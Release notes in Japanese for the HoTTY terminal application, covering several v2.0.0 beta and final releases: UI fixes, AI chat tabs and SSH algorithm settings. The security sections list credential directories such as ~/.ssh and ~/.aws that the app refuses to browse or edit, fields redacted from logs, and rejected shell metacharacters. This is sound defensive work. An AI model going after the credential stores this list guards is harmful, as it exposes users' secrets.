- **UI フォントの統一。** **Confirm**、**Paste Confirmation**、**SSH Host Key**、**Ask AI**、**Custom Theme Creator** モーダルのアクションボタン、および **Log Viewer**、**Ping Monitor**、**Text Editor** ペインのツールバーボタンが UI クローム用フォント (`--ui-font-family`) を使うようになりました。いくつかは等幅フォント (`--font-family`) で描画されており、周囲のクロームに対して微妙に浮いて見える状態でした。内部の等幅コンテンツ (ペースト時のプレビュー、ホストキーのフィンガープリント等) は従来どおりです。Confirm、Ask AI、Custom Theme Creator モーダルのコンテナにも欠落していたクロームフォント宣言を補いました。

### セキュリティ

- **ファイルエクスプローラーが機微なディレクトリの列挙を拒否するようになりました。** ファイルブラウザペイン (とその裏側の `file_explorer_list_directory` Tauri コマンド) は、認証情報の保管場所 — `~/.ssh`、`~/.aws`、`~/.azure`、`~/.gnupg`、`%APPDATA%\Roaming\gcloud`、`%APPDATA%\Local\Microsoft\Vault`、HoTTY 自身の `%APPDATA%\{Roaming,Local}\com.hotty.terminal`、その他既存のブロックリスト — に解決されるパスの列挙を拒否します。従来はレンダラーが任意のディレクトリを列挙でき、ファイルの中身は出ないものの、どの認証ファイルが存在しいつ最後に更新されたかが漏れていました。Text Editor や Log Viewer の読み取り経路は既に同等のガードで守られており、ファイルエクスプローラーも揃えるべき多層防御として実装しています (悪用にはそもそもレンダラー側の侵害が前提です)。
- **Windows で機微パスマッチャーが機能していなかった問題の修正。** `is_sensitive_path()` — Text Editor の読み書き / ドロップファイル承認 / Vertex AI サービスアカウントキーファイル選択フローのガード — は正規化済みパスに対して `starts_with(home + dir)` で前方一致比較を行っていました。Windows では `canonicalize()` が `\\?\` のベルバティム接頭辞付きパスを返しますが、マッチャー側でこれを除去していなかったため一致せず、ガードは正規化済みパスに対し事実上ノーオペでした。マッチャーは比較前に解決パスとホームディレクトリ双方から接頭辞を除去するようになり、リグレッションテストも追加しました。悪用報告はありませんが、これらのフローで本来効くべきだったオンディスク保護が実際に機能するようになりました。

## v2.0.0

v2.0.0 の正式版リリースです。最終ハードニング回として、認証情報の保存および Tauri コマンドサーフェスまわりに 5 件の多層防御を追加し、モーダルファミリー全体の細かなビジュアル統一を行いました。

### 改善

- **モーダルの一貫性の磨き込み。** モーダルファミリー全体でいくつかの細かなビジュアルの不整合を揃えました: **Ask AI** はスクロール時もコンテンツが角丸内に正しくクリップされ、**System Prompt** のオーバーレイは余計なインセットを持たなくなり、**Custom Theme Creator** は標準のモーダル z-index を使用するようになりました。**Paste Confirmation** と **SSH Host Key** ダイアログのコンテナは UI 用フォントを使うようになりました (内部の等幅プレビューとフィンガープリントは従来どおり)。Text Editor のメニュー・検索バー・検索クローズの各ボタンは標準の 4px 角丸を使うようになりました。

### セキュリティ

- **AI のサービスアカウントキーファイルにダイアログ承認を必須化しました。** Vertex AI の `service_account` 認証経路は、`keyFilePath` がネイティブのファイル選択ダイアログ経由で選ばれていない限り拒否するようになりました。レンダラーが侵害されても、AI 認証を任意のオンディスク JSON キーへ向けることはできません。`auto_auth` の再開経路は影響を受けません — DPAPI 暗号化済みのオンディスク設定から `client_email` と `private_key` を読み込み、ユーザーのキーファイル自体を再読込することはないためです。
- **DPAPI 暗号文を HoTTY に紐づけるようになりました。** 新規に保存される認証情報は、HoTTY 固有のエントロピーと、平文先頭に付与する内部「HoTTY」マーカーを併用して `CryptProtectData` で暗号化されます。レンダラーから呼び出せる `dpapi_decrypt` / `dpapi_decrypt_batch` コマンドはこれにより、他アプリケーションの DPAPI 暗号文 (例: 他のアプリが保存した暗号化キーブロブ) を復号しなくなります — 従来はユーザー単位の汎用復号オラクルとして機能していました。エントロピー導入前の旧 `[SAFE]` 暗号文は引き続き透過的に復号され、次回保存時に新形式へ自動アップグレードされます。
- **機微なパスのブロックリストを拡張しました。** Text Editor とドロップファイル承認フローは、`~/.aws`、`~/.azure`、`%APPDATA%\Roaming\gcloud`、`%APPDATA%\Local\Microsoft\Vault`、`~/.config/gcloud`、および HoTTY 自身の `%APPDATA%\{Roaming,Local}\com.hotty.terminal` 配下のパスを拒否するようになりました。最後の項目が重要で、エディター経由の書き込みが HoTTY の `approved_log_dirs.json` や `vertexai_config.json` などを改ざんできなくなります — これらが書き換え可能だと、他所で利用しているダイアログ承認の不変条件が崩れていました。
- **Telnet 自動ログインがパスワードをユーザー名として流出させなくなりました。** ログイン前バナーが `Username:` ではなく `...Password:` で終わっている telnet サーバーに接続すると、自動ログインのステートマシンがユーザー名送信前にパスワードフェーズへフォールスルーし、設定されたパスワードがユーザー名フィールドに送信される問題がありました。ステートマシンはユーザー名待ちの間、本物のユーザー名プロンプトにのみ反応するようになりました。
- **バックエンドのセッション設定の Debug 出力で認証情報を伏字化するようになりました。** `SshConfig`、`TelnetConfig`、`JumpboxConfig` は、Rust の `{:?}` デバッグフォーマッタを通して `password` / `private_key_passphrase` の値を露出しなくなりました。現状はどのログ呼び出し箇所にも到達していませんが、将来ログフォーマットのリグレッションによって誤って出力されるのを防ぐ多層防御です。

## v2.0.0-beta13

正式版リリース前の 2 回目のハードニング回です。ターミナルのフォントとスクロールバック設定が起動中のセッションにも即時反映されるようになり、AI チャットタブが連携ターミナルのクローズに追従するようになりました。あわせて、フロントエンドのログ出力・ログフォルダーへのアクセス・外部 URL のオープン周りで 3 つのセキュリティ強化を行っています。

### 改善

- **ターミナルのフォントとスクロールバック変更が起動中のセッションに反映されます。** **Settings &rarr; Appearance &rarr; Font Size** / **Font Family**、**Settings &rarr; General &rarr; Scrollback Buffer** の変更が、すでに開いているターミナルにも即時反映されるようになりました。従来は新規接続時のみ適用されていました。
- **AI チャットタブがセッションのライフサイクルに追従します。** ターミナルセッションが閉じられた場合 (切断時の自動クローズ、または手動クローズ) に、そのセッションにリンクされていた AI チャットペインのタブが連動してクローズされます。ペイン内の最後のタブはペインが使用不能にならないようリンクのみ解除されます。
- **モーダルのクローズ X ボタンの統一。** **Ask AI** および **System Prompt** ダイアログのヘッダークローズ X のフォントサイズが、他のモーダルと一致するように調整されました。

### セキュリティ

- **ログフォルダーが明示的な承認を必要とするようになりました。** ログ出力先・ログビューアからの読み込み先には、ユーザーが承認したフォルダーしか使用できません。**Browse...** ボタンでフォルダーを選択した場合は自動的に承認されます。手入力されたパスは、最初に使用される時点で OS ネイティブの確認ダイアログが表示されます。承認内容は `%APPDATA%\com.hotty.terminal\approved_log_dirs.json` に永続化されるため (ユーザー単位、レンダラーから書き込み不可)、フォルダーごとに 1 度承認すれば次回以降の起動でダイアログは出ません。レンダラーが侵害されてもこの承認を偽造できないため、Tauri コマンドの呼び出しだけで攻撃者指定のパスをログ書き込み・読み取り対象に追加することはできません。
- **キュレーション済みリスト外の外部 URL は確認が必要になりました。** HoTTY リポジトリ・gcloud インストールドキュメント・GPL ライセンス・Google OAuth 同意フローへのリンクは従来どおり即座に開かれます。それ以外の URL — ターミナル出力や AI チャットでユーザーがクリックしたリンクを含む — は、システムブラウザに渡される前に URL 全文を表示する OS ネイティブの確認ダイアログが表示されます。Tauri capability のスコープも対応してキュレーション済みホストのみに絞られました。
- **フロントエンドのログ転送が認証情報らしきフィールドを伏字化するようになりました。** `logDebug` (レンダラーから `%APPDATA%/com.hotty.terminal/logs/` 配下の永続デバッグログへ転送される経路) は、`password`, `apikey` / `api_key` / `api-key`, `secret`, `token`, `clientSecret`, `privateKey`, `refreshToken`, `accessToken`、および `Bearer` HTTP ヘッダーの値を伏字化します。メッセージ長は両端で 4 KB に制限されます。これは多層防御で、現状の既知のリーク修正ではなく、将来的に誤って認証情報をログ出力してしまうリグレッションが入った場合の被害範囲を限定することが目的です。

## v2.0.0-beta12

正式版リリース前のハードニング回です。SSH アルゴリズム既定値の現代化、AI チャットのストリームアイドル監視、ホストツリー・AI チャット履歴・ペルソナ設定まわりの静かなデータ整合性バグの修正、モーダル・フォーカス・入力バリデーション周辺の UX 改善を含みます。

### 新機能

- **AI チャットタブ → リンク先ターミナルのフラッシュ表示** — リンクされたターミナルセッションを持つ AI チャットタブをクリックすると、対応するターミナルペインが一瞬ハイライトされ、どのセッションに紐付いているかが一目でわかります。
- **AI ストリームのアイドル監視** — AI プロバイダがストリーム途中で応答を止めた場合 (ネットワーク断、バックエンドのハングなど)、3 分間の無音で自動的にリクエストをキャンセルし、ストリーミング状態のまま固まらずチャットにエラーが表示されます。
- **`diffie-hellman-group-exchange-sha1` 有効化時の警告ダイアログ** — **Settings → Protocols → SSH Algorithms** でこの非推奨 KEX を有効化しようとすると、SHA-1 が破られていることを説明し、より安全な代替を提示する警告ダイアログが表示されます。
- **AI チャット言語の OS ロケール自動検出** — 日本語ロケールの環境で初回起動した場合、AI チャットの言語が既定で「日本語」になります。既存ユーザーの選択は維持されます。
- **接続ダイアログの入力バリデーション** — 接続フォームが、空ホスト・1〜65535 範囲外のポート・不正な GCP プロジェクト ID・CRLF/空白の混入などを接続前にチェックするようになりました。

### 改善

- **モダンな SSH KEX 既定値** — 同梱のアルゴリズムリストで `diffie-hellman-group14-sha256` を有効、`diffie-hellman-group1-sha1` を無効にしました。既存ユーザーの選択はそのまま保持され、リリースで新規追加されたアルゴリズムは読み込み時にユーザー設定にマージされるため、手動リセットなしでセキュリティ改善が行き渡ります。
- **ジャンプボックス Host-Key プロンプトのタイムアウト** — バスチオンの host-key プロンプトを未応答のまま放置すると接続全体が無期限にハングしていましたが、5 分で接続を切断するようになりました。
- **モーダルの Escape スタック** — 複数モーダルが同時にマウントされている状態で Escape を押すと、最前面のモーダルだけが閉じます。従来は全モーダルのリスナーが並列発火し、見えていない背景モーダルまで閉じられる場合がありました。
- **モーダルクローズ後のフォーカス復元** — モーダルを閉じたとき、開く前にフォーカスを持っていた要素 (入力欄・ターミナル・ボタン) にフォーカスが戻ります。削除されたボタン上にフォーカスが取り残されることがありません。
- **マルチバイトプロンプトの検出** — ターミナルテキストをユーザー定義のプロンプトパターンに照合する前に NFC 正規化するようになりました。結合文字や全角文字 (日本語、アクセント付きラテン) を含むプロンプトが、機器の送出形式に依らず安定して検出されます。
- **静かに失敗していた処理の通知化** — クリップボードコピー失敗とセッションログ切替失敗がトースト通知として表示されるようになりました。AI チャットの invoke 失敗もハンドリングされ、UI が「streaming」状態で固まることがなくなりました。
- **到達不能な AI プロバイダで素早く失敗** — AI HTTP リクエストに 30 秒の接続タイムアウトを設定しました。設定ミスのエンドポイントでチャットがハングしません。

### バグ修正

- **セッション切断時にバックグラウンドタスクがリークしていました。** SSH/Serial/WSL/Local セッションは reader/writer/keepalive タスクハンドルに対し `tokio::time::timeout` を使っていましたが、タイムアウトしても JoinHandle が drop (デタッチ) されるだけでタスクは abort されていませんでした。長時間運用でゾンビタスクが少しずつ蓄積していました。猶予を 1.5 秒に延長したうえで、超過時は明示的に abort するように修正しました。
- **AI チャットでのキャンセル後にチャットが壊れることがありました。** ストリームをキャンセルすると、ユーザーメッセージのみが履歴に残り assistant 応答が無い状態になり、Anthropic が要求する user/assistant 交互ルールに違反していました。次回リクエストが API に拒否されます。キャンセルされたターンには `[cancelled]` プレースホルダーが記録され、以降のメッセージが正常に送信されるようになりました。
- **`aiCommandIdleTimeoutSecs`・カスタム AI ペルソナなどの設定がアップグレード時に消える可能性がありました。** 設定マイグレーションがバージョンバンプのたびに `aiPersonas` を同梱既定値で無条件上書きしていました。カスタマイズ済みプロンプトとユーザー追加ペルソナはアップグレードを跨いで保持され、最新の標準プロンプトを取り込みたい場合は Settings の **Reset All Personas** を使用してください。
- **アップデート通知の `beta9` と `beta10` の順序が逆転していました。** 文字列の辞書順比較で `beta10 < beta9` になるため、`beta10` のユーザーに `beta9` が新しいと通知される (またはアップデートが提示されない) ことがありました。同じアルファベット接頭辞を持つ pre-release タグは数値比較されるよう修正しました。
- **ホストツリーの編集が連続操作で失われる可能性がありました。** 暗号化が非同期のため、素早い 2 回の編集が逆順で完了し、古い暗号化結果が新しいものを上書きすることがありました。書き込みを単調増加カウンタで保護し、最新の暗号化結果のみ永続化されるようにしました。
- **セッションステータスがエラー遷移で一瞬ちらつくことがありました。** connect-promise の catch と `onSessionError` リスナーが同じ失敗で state 更新とログを二重に行っていました。冗長な経路を抑止しました。
- **設定を再オープンした際に古い「SHA-1 を有効化?」警告ダイアログが残ることがありました。** 警告ダイアログ表示中に Settings モーダルを閉じると保留状態が残存し、次回オープン時にダイアログが再出現していました。タブのアンマウント時に状態をリセットするようにしました。
- **AI チャットペインを連携先ターミナルより先に閉じると watch バッファがリークしていました。** 連携セッションのバッファがそのセッション自身が削除されるまで残存していました。セッション削除時には watch していたペインに関わらずバッファを必ず破棄するようにしました。

### セキュリティ

- **テキストエディタが symlink 直接ドロップを拒否します。** テキストエディタにドロップされたファイルがシンボリックリンクの場合、機密領域を指しているリンクを誤って承認させられないように直接拒否されます。
- **`known_hosts` 書き込み失敗がユーザーに通知されます。** SSH がエントリの保存・削除に失敗した場合 (権限不足、ディスクフル等) にログ出力に加え `ssh-known-hosts-warning` イベントを emit するようになりました。次回接続でホストキープロンプトが予期せず再出現してから気付くのではなく、発生時点で把握できます。
- **DPAPI のパススルーが疑わしい入力で警告するようになりました。** クレデンシャル復号器が `[` で始まる (が未知のタグの) 入力でプレーンテキストパススルーにフォールバックした場合、暗号化タグの破損が判別できるようログに警告が出力されます。

## v2.0.0-beta11

正確性とセキュリティに関するリリースです。これまで見た目だけだった Settings の SSH アルゴリズム設定が実際にハンドシェイクへ反映されるようになり、SHA-1 KEX・3DES・DSA ホストキーを要求するレガシー機器との接続が可能になりました。あわせて、ジャンプボックス側 SSH の `known_hosts` I/O ハードニング (直接接続側と同等) も追加しています。

### バグ修正

- **Settings の SSH アルゴリズム設定が接続に反映されるようになりました。** 従来は **Settings &rarr; Protocols &rarr; SSH Algorithms** の kex / cipher / MAC / ホストキーのトグルが保存されるだけで SSH クライアント側に渡されておらず、UI 上の選択に関わらず常に russh の組み込み既定リストが提示されていました。今回の修正で直接 SSH 接続にもジャンプボックス経由にも、UI で有効化したアルゴリズムが実際にハンドシェイクで使われます。これにより、SHA-1 KEX (`diffie-hellman-group14-sha1`, `diffie-hellman-group1-sha1`, `diffie-hellman-group-exchange-sha1`)、`3des-cbc`、`ssh-dss` ホストキーしか受け付けないレガシー機器 (Cisco Catalyst 3650・旧 Cisco IOS など) にも接続できるようになりました。これらは選択可能かつ実効性のある状態になっています。
- いずれかのカテゴリ内で全アルゴリズムを無効化した場合、ライブラリ既定値へ無言でフォールバックせず、明確なエラーで接続を拒否するようになりました。設定に未知のアルゴリズム名が含まれていた場合は警告ログを出してスキップされます。

### セキュリティ

- **ジャンプボックス側 `known_hosts` の I/O エラー時に接続を拒否するようになりました。** 直接 SSH 接続側と同じハードニングをジャンプボックス経路にも適用しています。バスチオン側の `known_hosts` を破壊・読み取り不能にできる攻撃者が、ユーザーを「新しいホスト」プロンプトへ戻して攻撃者制御下のキーを承認させるシナリオを防ぎます。

## v2.0.0-beta10

AI チャット UX の大幅刷新を中心としたリリースです。AI チャットペイン内のタブ化とターミナルセッションへのスマート連携、入力欄に統合した実行モードバー (一時停止／再開対応)、デバイス応答アイドルタイムアウト設定の追加、Network Expert ペルソナのプロンプト改善などを含みます。

### 新機能

- **AI チャットタブ** — AI チャットペイン上部にタブストリップを追加し、複数の会話を並行管理できるようになりました。ターミナルで **AI モニター** をオンにするとそのセッション専用タブが自動でリンクされ、別のターミナルでオンにすると新しいタブが作られるため、複数の監視ストリームが混ざりません。ターミナルを選択するとリンクされた AI タブに自動で切り替わり、現在リンクしているターミナルは入力欄の隣にチップとして表示されます。**+ New chat** で新しいタブを開けます。
- **インライン実行モードバー (一時停止／再開)** — AI チャットペインの入力カード下部に Execution Mode チップを配置し、自動実行ループ専用の一時停止／再開コントロールを追加しました。これらの操作は従来 Settings ダイアログ側にありました。
- **AI コマンドのアイドルタイムアウト** — `aiCommandIdleTimeoutSecs` 設定 (既定 10 秒、`0` で無効、上限 30 分) を新設し、AI 実行ポーリングの暗黙の 30 秒タイムアウトを置き換えました。タイムアウト発火時は、それまでに取得した出力と `[no response from device for N seconds]` の注記を AI に送るため、会話が無音で止まらず継続されます。

### 改善

- **AI チャット UX の再設計** — チップ状のモード選択、リンク済みターミナルチップ、空状態のオンボーディング、送信無効時のヒント、ストリーミング中のトークン進捗表示を追加。
- **AI チャット入力欄の統合** — 入力欄、添付物、実行モードチップを単一の角丸カードに統合し、チップを右寄せに配置して見た目を整理しました。
- **AI チャットヘッダー設定をポップオーバーへ集約** — 従来 AI チャットヘッダーに散らばっていた設定項目を、入力ツールバーから開くポップオーバーに集約しました。スタンドアロンの System Prompt ボタンは削除し、ポップオーバー内へ移しています。
- **折りたたみ可能なターミナル出力ブロック** — AI チャットに取り込まれたターミナル出力を、先頭コマンド・行数・文字数をヘッダーに表示する折りたたみブロックとして描画します。クリックまたは <kbd>Enter</kbd> / <kbd>Space</kbd> で展開／折りたたみ。
- **Network Expert ペルソナのプロンプト** — 先頭に必須のセッション開始プロトコル (REPLY 1 で `show version` 相当、REPLY 2 で `terminal length 0` 相当、REPLY 3 以降でユーザー応答) を強制する形で書き直し、ページャ付きデバイスで応答ループが止まらないようにしました。
- **SSH/Telnet 接続タイムアウト既定値** — 3 秒から 5 秒に引き上げ、ジャンプボックス／IAP トンネル経由などの遅い経路でも待ちやすくしました。

### バグ修正

- **AI チャットのターゲットチップが残る問題** — リンク先セッションが削除された場合や **AI モニター** が無効化された場合に、リンク済みターミナルチップが正しくクリアされるようになりました。従来は存在しないセッションを指したまま残っていました。
- **AI 実行時の出力切り詰め** — AI 実行ループが取得した長いターミナル出力がモデルに渡る前に切り詰められていた経路を修正しました。

## v2.0.0-beta9

ホストツリーの v1→v2 認証情報自動マイグレーション、ペースト周りの不具合修正、Asset プロトコルおよび SSH known_hosts のセキュリティ強化を含むリリースです。

### 改善

- **ホストツリーの v1→v2 認証情報自動マイグレーション** — 旧 Electron 版 HoTTY (v1) で書き出されたホストツリーは `username` / `password` を `[SAFE]` + base64(`v10` + DPAPI ブロブ) 形式で保持していました。読み込み時に v2 形式 (`[SAFE]` + base64(DPAPI ブロブ)) へインプレースで自動アップグレードします。マイグレーションは Rust バックエンドで実行され、冪等 (v2 エントリはバイト一致でそのまま通過) で、平文の認証情報は IPC 境界を越えません。

### バグ修正

- **Ctrl+V でクリップボード内容が二重にペーストされる問題** — Ctrl+V を押すと、ペースト確認ダイアログが開く前に 1 回ペーストされ、ダイアログで「Paste」を押下するともう 1 回ペーストされていました。xterm.js 内部の `paste` DOM リスナーが、私たちの keydown インターセプターとは独立に発火していたためです。ターミナルホスト側でネイティブの paste イベントを抑止するようにし、確認ダイアログだけがペースト経路になるよう修正しました。右クリックペーストは影響を受けません。
- **ペースト確認ダイアログ閉鎖後にターミナルがフォーカスを失う問題** — ダイアログの Confirm / Cancel 後、削除済みの「Paste」ボタンにフォーカスが取り残され、キーボード入力に戻るには追加のクリックが必要でした。ダイアログのアンマウント後、ペーストを起動したターミナルペインへ自動的にフォーカスを戻すようにしました。

### セキュリティ

- **Tauri Asset プロトコルのスコープを狭窄** — v2 ラインの初期に `tauri.conf.json` の `assetProtocol.scope` が `**` (任意パス) に拡げられていましたが、今回画像拡張子のみ (`.png`, `.jpg`, `.jpeg`, `.gif`, `.bmp`, `.webp`, `.ico`, `.svg`) に制限しました。ペイン背景画像機能は引き続き動作します。レンダラ侵害時の多層防御の強化です。
- **SSH known_hosts の I/O エラー時に接続を拒否** — 従来は `known_hosts` の読み取りで *何らかの* エラー (権限拒否、ディスク障害、部分読み出し) が発生すると、すべて「新規ホスト」として黙って扱い、ユーザーに再プロンプトしていました。攻撃者が当該ファイルを破損 / chmod 0 できる場合、信頼済みホストの再プロンプトを誘発し、差し替えたホスト鍵を承認させる経路になり得ました。本物の I/O エラーはログ出力のうえ接続を拒否し、「ファイル未存在」(初回ユーザー) のみ従来どおり新規ホストプロンプトを返します。

## v2.0.0-beta8

接続ライフサイクル UI、Line Wrap オフ時の水平スクロール、マーカーとスクロールバーをペイン右端に固定する 3 レイヤー構成のターミナルレイアウトを追加したリリースです。

### 新機能

- **接続ライフサイクルオーバーレイ** — トランスポート確立中に Connecting オーバーレイを表示し、接続失敗を黙って終わらせるのではなく閉じられるトースト通知で通知するようになりました。セッションステータスに明示的な `connecting` / `error` を追加し、タブとペイン枠線の色をテーマで切り替え可能にしました。
- **接続タイムアウトを設定可能に** — SSH / Telnet 接続が無限に待機せず、ユーザーが設定可能な時間 (既定 3 秒) でタイムアウトするようになりました。
- **Line Wrap オフ時の水平スクロール** — Line Wrap を無効にするとターミナルペインに水平スクロールバーが復活し、カーソルが右端を越えると伸長します。Enter でスクロール位置がカラム 0 に戻り、入力中はカーソルが見える位置までホストが自動スクロールします。

### 改善

- **3 レイヤーのターミナルレイアウト** — プロンプトマーカーとバーティカルスクロールバーを xterm ホスト外側の専用 DOM レール上にレンダリングするように変更。ホストの水平スクロール位置に関係なく常にペイン右端に固定されるため、スクロールバー / マーカー / テキストが重ならなくなりました。
- **ターミナルのカスタムバーティカルスクロールバー** — xterm v6 既定の Monaco 風スクロールバーをアプリ全体のクロームと統一されたスタイル (グローバルなスクロールバースタイル) に置換。
- **Connecting 状態のテーマカラー** — 新しい接続中状態用のタブ／ペイン色を Dark / Medium / Light の各テーマに既定値として追加。

### バグ修正

- **プロンプトマーカーの色** — プロンプトは prompt-default テーマカラー (赤) を、prompt-active (青) は非プロンプト行 (出力) のみに使用するよう修正。
- **プロンプトマーカーの検出漏れ** — `onRender` で参照していた古いバッファ位置を `buffer.baseY` に置き換えて検出漏れを修正。末尾の未使用行にマーカーが付かないようにしました。
- **プロンプトマーカーの位置ズレ** — マーカーを `right` 基準で配置するよう変更し、親要素の左端や水平スクロール位置に依存して位置がズレる問題を解消。オーバーレイスクロールバー向けの CSS フォールバックと、起動時のカーソル遷移を吸収するコンテンツ基準のチェックを追加。
- **スクロールバー隅のアーティファクト** — 一部ペインの右下に出ていたスクロールバー隅 / リサイザー / ボタンの描画残りを非表示化。
- **出力直後にターミナルビューポートが 1 行巻き戻る** — 本リリースで導入した 3 レイヤーレイアウトの不具合で、`dir` 出力など高頻度な書き込み時にビューポートが 1 行戻り、末尾のプロンプト行がキー入力まで表示されないことがありました。カスタムスクロールバーのスペーサー高さをスクロールイベントと同期して書き込むように修正し、常に最新の出力に追従するようにしました。

## v2.0.0-beta7

上書きインストールの安全性向上、依存パッケージのセキュリティ更新、モーダルの重なり順に関する修正を含むリリースです。

### バグ修正

- **インストーラーが上書きインストール時に「Uninstall before installing」を既定にしない** — 既存の HoTTY インストールを検出した際、アップグレード／ダウングレードのシナリオでは **「Don't uninstall (設定を保持)」** ラジオボタンが事前選択・フォーカスされるようになりました。従来は破壊的な「Uninstall」が既定であり、確認せず進むと WebView2 のローカルストレージに保存されている HostTree や AI プロバイダー認証情報が消える恐れがありました。同一バージョンの再インストール時の挙動は変更ありません。
- **ヘルプモーダルの z-index** — 規約に合わせて `10001` から `10000` に修正。従来値ではネストされた他のオーバーレイより上に表示されるおそれがありました。
- **保存確認モーダルの z-index** — 同様の理由で `10001` から `10000` に修正。このダイアログが他のモーダルの上に表示されることはありません。

### セキュリティ

- **DOMPurify を 3.4.0 にアップグレード** — [GHSA-39q2-94rc-95cp](https://github.com/advisories/GHSA-39q2-94rc-95cp) に対応。`ADD_TAGS` の短絡評価により `FORBID_TAGS` が回避される問題を修正。AI 生成マークダウンは DOMPurify で無害化されるため、当該経路を強化します。

## v2.0.0-beta6

UI 仕上げ、近未来的なテーマ効果、空きペインの背景カスタマイズ、セキュリティ強化を中心とした6番目のベータリリースです。

### 新機能

- **空きペインの背景** — **設定 → 外観** で、空のグリッドペインに表示する単色または任意の画像を選択可能
- **近未来的テーマ効果** — カスタムテーマエディタに **Futuristic Effects** セクションを追加。アクティブペイン/サイドバーアイコンのネオングロー、モーダルのグラスモーフィズム (背景ぼかし)、アイコン線幅・グローぼかしの調整に対応
- **ファイルエクスプローラのサイドバー優先配置** — File Explorer を開くと、グリッドセルを埋める前に空きサイドバースロットへ割り当てる `preferSidebar` 戦略を追加
- **空きペインのドロップヒント** — 空のグリッドセルにペイン番号と「Drop Tab Here」の案内を表示し、タブの配置先を分かりやすく

### 改善

- **設定 UI のリニューアル** — Appearance / Features / General / Protocols の各タブを「カード」単位にグループ化し、Layout / Theme / Font / Terminal Display などのセクションタイトルで視認性を改善
- **テーマ刷新** — ダーク系の `accent-color` を明るい `#00b4ff` に変更、`prompt-highlight-default` / `glow-*` / `glass-*` 変数を Dark / Light / Medium 全テーマに追加
- **アイコンの線を細く** — AI Chat、File Explorer、Log Viewer、Ping Monitor、Help、AppSidebar、TabBar、Sidebar の SVG 線幅を `2` から `1.5` に変更し、洗練された見た目に統一
- **モーダルの背景ぼかし** — すべてのモーダルオーバーレイに控えめな 6px のぼかしを追加
- **プロンプトハイライトのデフォルトがテーマ追従** — 未設定時は `--prompt-highlight-default` を参照するようになり、テーマ切替に追従
- **Ask AI モーダルのスタイル修正** — 回帰していたプライマリボタンの背景・余白・ホバー状態を復元
- **依存整理** — 未使用の `@tauri-apps/plugin-shell` npm 依存を削除

### バグ修正

- **v1 htree インポートの資格情報破損修正** — 旧 v1 ホストツリーからインポートした際に、ユーザー名とパスワードが誤ったフィールドにマッピングされていた問題を修正
- **About タブの GitHub リンク修正** — リンク先および `horryworks/HoTTY-Rust-Tauri` リポジトリ URL を更新
- **セッション重複レース修正** — `connect_session` が接続完了後に ID の重複を再チェックし、衝突時に新しいサービスを安全に切断するように変更

### セキュリティ

- **テキストエディタの TOCTOU 対策** — `text_editor_read_file` / `write_file` が I/O 実行時に解決済みパスとファイルサイズを再検証。ダイアログ承認後のシンボリックリンク差し替えを防止
- **ログビューアの TOCTOU 修正** — `read_log_file` が元の解決パスではなく、再 canonicalize 後のパスから読み取るように修正
- **HTML サニタイザ強化** — AI 出力マークダウンで DOMPurify が `svg` / `iframe` / `object` / `embed` / `script` / `link` / `base` 要素と広範な `on*` イベントハンドラ属性を禁止
- **WSL ディストリビューション名の検証** — 正規表現チェックの前にシェルメタ文字 (`$`, バッククォート, `;`, `&`, `|`, リダイレクト, 引用符, 空白) を拒否 (多層防御)
- **GCP IAP トンネルの argv 強化** — Windows 上で gcloud 呼び出しをシェル文字列組み立てではなく argv 配列 (`cmd /C gcloud.cmd <args>`) で渡すよう変更し、クォート由来のインジェクションリスクを排除
- **アセットプロトコルのスコープ明示** — Tauri `protocol-asset` を有効化し、CSP の `img-src` で `http://asset.localhost` を明示的に許可することで、ユーザー指定のペイン背景画像を安全に配信

## v2.0.0-beta5

セキュリティ強化、AI プロバイダーアイコンのテーマ対応、UI 改善に焦点を当てた5番目のベータリリースです。

### 改善

- **AI プロバイダーアイコンのテーマ対応** — Gemini のグラデーション、OpenAI、Anthropic、Vertex AI の各アイコン色をテーマ変数 (`provider-gemini-1/2/3`, `provider-openai`, `provider-anthropic`, `provider-vertex-ai`) から取得するように変更。カスタムテーマエディタに新セクション **AI Providers** を追加
- **シェルプラグインの置き換え** — 外部 URL 起動用プラグインを `tauri-plugin-shell` から軽量な `tauri-plugin-opener` に移行し、許可する機能範囲を縮小
- **AI プロバイダーのストリーミング整合性** — Anthropic / Gemini / OpenAI / Vertex AI の各プロバイダーで、キャンセル時や応答が空の場合でも chat-done イベントを発行し、ローディング状態が残らないように修正
- **モーダルの一貫性** — ConfirmModal / PasteConfirmationModal / AskAiModal のアクションボタン余白 (`6px 16px`) とフッター間隔 (`8px`) を UI 規約に揃えて統一

### セキュリティ

- **SSH 認証失敗時の資格情報消去** — パスワードおよび秘密鍵パスフレーズを認証試行直後 (成功・失敗を問わず) にメモリから消去し、認証失敗時に平文の機密情報が残る隙をなくしました
- **IAP トンネルのゾーンフィルタ強化** — GCE インスタンス一覧取得で `--filter=zone:(…)` ではなく専用の `--zones=` フラグを使用することで、gcloud フィルタ構文のエッジケース影響を排除
- **DPAPI unsafe ブロックへの安全性コメント追加** — `CryptProtectData` / `CryptUnprotectData` 呼び出しにバッファ初期化・寿命・`LocalFree` 所有権に関する SAFETY 不変条件を明示

## v2.0.0-beta4

ジャンプボックス経由の接続、自動アップデート通知、編集ワークフローの安全性向上、セキュリティ強化に焦点を当てた4番目のベータリリースです。

### 新機能

- **SSH/Telnet ジャンプボックス (踏み台) トンネリング** — SSH 踏み台ホスト経由で目的の SSH / Telnet サーバーへ `direct-tcpip` チャネルで接続。踏み台側もホストキー検証とキーボードインタラクティブ認証に対応
- **自動アップデート通知** — 起動時に GitHub リリース API で新バージョンを確認し、閉じられる通知からリリースページへ直接遷移
- **未保存変更の確認プロンプト** — テキストエディタでタブを閉じる / 終了する際に未保存があれば保存 / 破棄 / キャンセルを問うモーダルを表示、複数ペインを跨ぐ未保存状態トラッカーと連動
- **AI システムプロンプトビューア** — 現在の AI ペルソナに送信される実効的なシステム指示をクリップボードコピー付きで閲覧可能
- **React Error Boundary** — 最上位のエラーバウンダリがレンダラのクラッシュを捕捉し、空白画面の代わりに復帰可能なフォールバック UI を表示

### 改善

- **Telnet サービス** — 接続処理を SSH と共通のジャンプボックストンネル抽象に統一、トランスポート処理を一元化
- **tauriService** — 新しい updater / jumpbox コマンド向けの型付きラッパーを追加
- **useResize フック** — ペインのドラッグリサイズに関する使用感を小改善
- **アプリシェル** — UpdateNotification、SaveConfirmModal、SystemPromptModal、ErrorBoundary を最上位レイアウトに統合

### セキュリティ

- **SSH 認証情報のバリデーション** — `SshConfig::validate` にホスト / ユーザー名 / パスワード / パスフレーズの長さ上限を追加、SSH スタックに到達する前に不正・過大な入力を拒否
- **ログビューアの TOCTOU 対策** — 読み取り直前に解決済みパスを再 canonicalize し、許可ディレクトリチェックを再実行。チェック〜読み取り間のシンボリックリンク差し替え攻撃を防止
